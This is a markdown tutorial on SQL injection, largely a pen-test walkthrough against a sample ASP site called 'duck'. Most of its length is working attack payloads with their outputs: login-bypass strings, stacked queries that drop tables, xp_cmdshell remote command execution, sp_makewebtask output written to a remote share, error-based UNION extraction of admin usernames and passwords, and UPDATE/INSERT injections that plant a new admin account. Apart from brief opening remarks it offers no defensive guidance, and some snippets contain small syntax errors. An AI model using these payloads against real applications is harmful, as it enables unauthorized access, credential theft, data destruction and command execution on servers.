**SQL Injection Tutorial**
===

## What is SQL Injection?
SQL Injection the most popular method to pass SQL command deliberately from input filed in application. As a developer you should know how to prevent your application from SQL Injection. 
SQL Injection is one of the many web attack mechanisms used by hackers to steal data from organizations. It is perhaps one of the most common application layer attack techniques used today. It is the type of attack that takes advantage of improper coding of your web applications that allows hacker to inject SQL commands into say a login form to allow them to gain access to the data held within your database.

## Which part of your application is in threat for SQL Injection?
SQL Injection is the hacking technique which attempts to pass SQL commands and SQL queries (statements) through a web application or desktop application for execution by the backend database. If not sanitized properly, web applications may result in SQL Injection attacks that allow hackers to view information from the database and/or even wipe it out. 

Such features as login pages, support and product request forms, feedback forms, search pages, shopping carts and the general delivery of dynamic content, shape modern websites and provide businesses with the means necessary to communicate with prospects and customers. These website features are all examples of web applications which may be either purchased off-the-shelf or developed as bespoke programs.
These website features are all susceptible to SQL Injection attacks which arise because the fields available for user input allow SQL statements to pass through and query the database directly.

## Basic SQL Injection, power of `'T'='T'`
Most login page is ask for User Name and Password from the user. User type the user name and password in the login form and submit for authenticate. System query the database with supplied user name and password if it found in the database it authenticate the user otherwise it show login fail message. When we submit the login page most login page will pass query to database like. 
``` sql
select * from user_master where user_name='" & TxtUserName.Text & "' and user_password ="" & TxtPassword.Text & "'"
```
If we type User Name as ANYUSER and Password as ANYPASS then actual query look like. 
``` sql
select * from user_master where user_name='ANYUSER' and user_password ='ANYPASS'
```
It will not work as there is no such user name and password in the table user_master. and it will show login fail message. Now just change your password and type ANYPASS' or 'T' = 'T and submit the page again. This time the query look like. 
``` sql
select * from user_master where user_name='ANYUSER' and user_password ='ANYPASS' or 'T' = 'T'
```
Now it works and you are able to login the page without knowing the user name and password. How it was happen. the query will always return all records from the database because 'T' = 'T' always True. 

## What are the SQL command you can pass
If the underlying database supports multiple command in single line, then you can pass any valid DML, DCL and DDL command through SQL injection. 
for example following command will drop user_master table from the database. 
For example type in password box
```
ANYPASS' ; drop table user_master -- 
```
and submit the page again. this time underlying query looks like. 

``` sql
select * from user_master where user_name='ANYUSER' and user_password ='ANYPASS' ; drop table user_master -- '
```
Now it drop the user_master table from the database. In this case we pass drop table command along with password. -- two dash is comment for SQL no other code will be executed after that. If you know the table structure then you can Insert and update the record as well through SQL Injection. 

## SQL Injection by example

When a machine has only port 80 opened, your most trusted vulnerability scanner cannot return anything useful, and you know that the admin always patch his server, we have to turn to web hacking. SQL injection is one of type of web hacking that require nothing but port 80 and it might just work even if the admin is patch-happy. It attacks on the web application (like ASP, JSP, PHP, CGI, etc) itself rather than on the web server or services running in the OS.

This will help beginners with grasping the problems facing them while trying to utilize SQL Injection techniques, to successfully utilize them, and to protect themselves from such attacks.

This article does not introduce anything new, SQL injection has been widely written and used in the wild. We wrote the article because we would like to document some of our pen-test using SQL injection and hope that it may be of some use to others. You may find a trick or two but please check out the "11.0 Where can I get more info?" for people who truly deserve credit for developing many techniques in SQL injection.

## What do you need for SQL Injection?
Any web browser. 

### Where to Start SQL Injection?
Try to look for pages that allow you to submit data, i.e: login page, search page, feedback, etc. Sometimes, HTML pages use POST command to send parameters to another ASP page. Therefore, you may not see the parameters in the URL. However, you can check the source code of the HTML, and look for "FORM" tag in the HTML code. You may find something like this in some HTML codes: 



Everything between the and have potential parameters that might be useful (exploit wise). 
#### 1. What if you can't find any page that takes input?
You should look for pages like ASP, JSP, CGI, or PHP web pages. Try to look especially for URL that takes parameters, like: http://duck/index.asp?id=10 
#### 2. How do you test if it is vulnerable for SQL Injection?
Start with a single quote trick. Input something like: 
```hi' or 1=1--```
Into login, or password, or even in the URL. Example: 
``` sql
Login: hi' or 1=1--
Pass: hi' or 1=1--
http://duck/index.asp?id=hi' or 1=1--
```

If you must do this with a hidden field, just download the source HTML from the site, save it in your hard disk, modify the URL and hidden field accordingly. 
Example:
```html
<form action="http://duck/Search/search.asp" method="post">
    <input name="A" type="hidden" value="hi' or 1=1--" />
</form>
```
If luck is on your side, you will get login without any login name or password.

#### 3. But why ' or 1=1-- is important in SQL Injection?

Let us look at another example why ' or 1=1-- is important. Other than bypassing login, it is also possible to view extra information that is not normally available. Take an asp page that will link you to another page with the following URL:`http://duck/index.asp?category=food`

In the URL, ```'category'``` is the variable name, and ```'food'``` is the value assigned to the variable. In order to do that, an ASP might contain the following code (OK, this is the actual code that we created for this exercise):
```
v_cat =request("category")
sqlstr=&amp;quot;SELECT * FROM product WHERE PCategory='" & v_cat & "'"
set rs=conn.execute(sqlstr)
```
As we can see, our variable will be wrapped into v_cat and thus the SQL statement should become: 
```sql 
SELECT * FROM product WHERE PCategory='food'
```

The query should return a resultset containing one or more rows that match the `WHERE` condition, in this case, `'food'`. Now, assume that we change the URL into something like this:
```
http://duck/index.asp?category=food' or 1=1--
```
Now, our variable `v_cat equals` to "food' or 1=1-- ", if we substitute this in the SQL query, we will have: 
``` sql
SELECT * FROM product WHERE PCategory='food' or 1=1--'
```
The query now should now select everything from the product table regardless if PCategory is equal to `'food'` or not. A double dash ```"--"``` tell MS SQL server ignore the rest of the query, which will get rid of the last hanging single quote `(')`. Sometimes, it may be possible to replace double dash with single hash `"#"`.

However, if it is not an SQL server, or you simply cannot ignore the rest of the query, you also may try 
```' or 'a'='a```
The SQL query will now become: 
``` sql 
SELECT * FROM product WHERE PCategory='food' or 'a'='a'
```
It should return the same result. Depending on the actual SQL query, you may have to try some of these possibilities: 
```
' or 1=1--

" or 1=1--

or 1=1--

' or 'a'='a

" or "a"="a

') or ('a'='a
```
#### 4. How do I get remote execution with SQL injection?

Being able to inject SQL command usually mean, we can execute any SQL query at will. Default installation of MS SQL Server is running as SYSTEM, which is equivalent to Administrator access in Windows. We can use stored procedures like master..xp_cmdshell to perform remote execution:
```
'; exec 
master..xp_cmdshell 'ping 10.10.1.2'--
```
Try using double quote `(")` if single quote `(')` is not working. The semi colon will end the current SQL query and thus allow you to start a new SQL command. To verify that the command executed successfully, you can listen to ICMP packet from 10.10.1.2, check if there is any packet from the server:
```
#tcpdump 
icmp
```
If you do not get any ping request from the server, and get error message indicating permission error, it is possible that the administrator has limited Web User access to these stored procedures.

#### 5 How to get output of my SQL query by SQL Injection?
It is possible to use sp_makewebtask to write your query into an HTML: 
``` sql
'; EXEC master..sp_makewebtask "\\10.10.1.3\share\output.html", "SELECT * FROM INFORMATION_SCHEMA.TABLES"
```
But the target IP must folder "share" sharing for Everyone. 
#### 6 How to get data from the database using ODBC error message by SQL Injection?
We can use information from error message produced by the MSSQL Server to get almost any data we want. Take the following page for example: 
```
http://duck/index.asp?id=10
```
We will try to UNION the integer '10' with another string from the database: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
```
The system table `INFORMATION_SCHEMA.TABLES` contains information of all tables in the server. The `TABLE_NAME` field obviously contains the name of each table in the database. It was chosen because we know it always exists. Our query: 
```sql 
SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES-
```
This should return the first table name in the database. When we UNION this string value to an integer 10, MS SQL Server will try to convert a string (nvarchar) to an integer. This will produce an error, since we cannot convert nvarchar to int. The server will display the following error:
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error 
converting the nvarchar value 'table1' to a column of data 
type int. 

/index.asp, line 5
```
The error message is nice enough to tell us the value that cannot be converted into an integer. In this case, we have obtained the first table name in the database, which is `"table1"`.
To get the next table name, we can use the following query: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN ('table1')--
```
We also can search for data using LIKE keyword: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%25login%25'--
```
Output: 
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'admin_login' to a column of data type int. 

/index.asp, line 5
```
The matching patent, `'%25login%25'` will be seen as %login% in SQL Server. In this case, we will get the first table name that matches the criteria, `"admin_login"`.

#### 7. How to mine all column names of a table by SQL Injection?
We can use another useful table INFORMATION_SCHEMA.COLUMNS to map out all columns name of a table: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login'--
```
Output:
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error 
converting the nvarchar value 'login_id' to a column of data 
type int. 
/index.asp, line 5
```
Now that we have the first column name, we can use NOT IN () to get the next column name: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id')--
```
Output: 
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'login_name' to a column of data type int. 
/index.asp, line 5
```
When we continue further, we obtained the rest of the column name, i.e. "password", "details". We know this when we get the following error message: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id','login_name','password',details')--
```
Output: 
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'

[Microsoft][ODBC SQL Server Driver][SQL Server]ORDER BY items must appear in the select list if the statement contains a UNION operator. 

/index.asp, line 5
```

#### 8. How to retrieve any data we want?
Now that we have identified some important tables, and their column, we can use the same technique to gather any information we want from the database. Now, let's get the first login_name from the "admin_login" table: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 login_name FROM admin_login--
```
Output: 
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value 'neo' to a column of data type int. 

/index.asp, line 5
```
We now know there is an admin user with the login name of "neo". Finally, to get the password of "neo" from the database: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 password FROM admin_login where login_name='neo'--
```
Output: 
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error 
converting the nvarchar value 'm4trix' to a column of data 
type int. 

/index.asp, line 5
```
We can now login as `"neo"` with his password `"m4trix"`. 

#### 9. How to get numeric string value?

There is limitation with the technique describe above. We cannot get any error message if we are trying to convert text that consists of valid number (character between 0-9 only). Let say we are trying to get password of `"trinity"` which is `"31173"`:
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 password FROM admin_login where login_name='trinity'--
```
We will probably get a `"Page Not Found"` error. The reason being, the password `"31173"` will be converted into a number, before `UNION` with an integer (10 in this case). Since it is a valid `UNION` statement, SQL server will not throw ODBC error message, and thus, we will not be able to retrieve any numeric entry.
To solve this problem, we can append the numeric string with some alphabets to make sure the conversion fail. Let us try this query instead: 
```sql
http://duck/index.asp?id=10 UNION SELECT TOP 1 convert(int, password%2b'%20morpheus') FROM admin_login where login_name='trinity'--
```
We simply use a plus sign `(+)` to append the password with any text we want. **(ASSCII code for '+' = 0x2b)**. We will append `'(space)morpheus'` into the actual password. Therefore, even if we have a numeric string `'31173'`, it will become `'31173 morpheus'`. By manually calling the convert() function, trying to convert `'31173 morpheus'` into an integer, SQL Server will throw out ODBC error message: 
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 

[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the nvarchar value '31173 morpheus' to a column of data type int. 

/index.asp, line 5
```
Now, you can even login as 'trinity' with the password '31173'. 

#### 10. How to update/insert data into the database by SQL Injection?
When we successfully gather all column name of a table, it is possible for us to UPDATE or even INSERT a new record in the table. For example, to change password for "neo": 
```sql
http://duck/index.asp?id=10; UPDATE 'admin_login' SET 'password' = 'newpas5' WHERE login_name='neo'--
```
To `INSERT` a new record into the database: 
```sql
http://duck/index.asp?id=10; INSERT INTO 'admin_login' ('login_id', 'login_name', 'password', 'details') VALUES (666,'neo2','newpas5',&#39;NA')--
```
We can now login as `"neo2"` with the password of `"newpas5"`.

---
